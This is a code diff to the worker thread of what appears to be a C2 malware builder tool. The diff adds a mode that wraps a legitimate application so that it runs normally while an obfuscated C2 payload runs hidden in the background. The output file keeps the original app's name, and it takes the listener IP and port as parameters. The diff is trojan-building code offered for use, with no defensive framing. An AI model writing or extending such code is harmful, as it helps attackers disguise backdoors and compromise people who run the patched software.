@@ -68,21 +68,29 @@ class BundlerWorker(QThread):
 
             self.progress.emit("[*] Creating C2 payload...")
             
-            # Si patch_file existe, on l'intègre (future feature)
+            # Si patch_file existe, on l'intègre
             if self.patch_file:
                 self.progress.emit(f"[*] Patching file: {self.patch_file}")
-                # TODO: Implémenter patching
-                self.progress.emit("[!] Patch mode not yet implemented - creating standalone payload")
+                self.progress.emit(f"[*] Mode: Wrapper (original app + C2 background)")
             
             success = create_bundled_payload(
-                self.listener_ip, self.listener_port, obfuscation_level, self.platform
+                self.listener_ip, 
+                self.listener_port, 
+                obfuscation_level, 
+                self.platform,
+                self.patch_file  # Pass patch_file to bundler
             )
 
             if success:
                 self.progress.emit("")
                 self.progress.emit("[+] SUCCESS!")
-                self.progress.emit("[+] Location: dist/c2_payload.exe")
-                self.progress.emit("[+] C2 is hidden and obfuscated!")
+                if self.patch_file:
+                    self.progress.emit(f"[+] Location: dist/{Path(self.patch_file).name}")
+                    self.progress.emit("[+] Patched file ready!")
+                    self.progress.emit("[+] Original app will run + C2 in background!")
+                else:
+                    self.progress.emit("[+] Location: dist/c2_payload.exe")
+                    self.progress.emit("[+] C2 is hidden and obfuscated!")
                 self.finished.emit(True)
             else:
                 self.progress.emit("[!] FAILED")
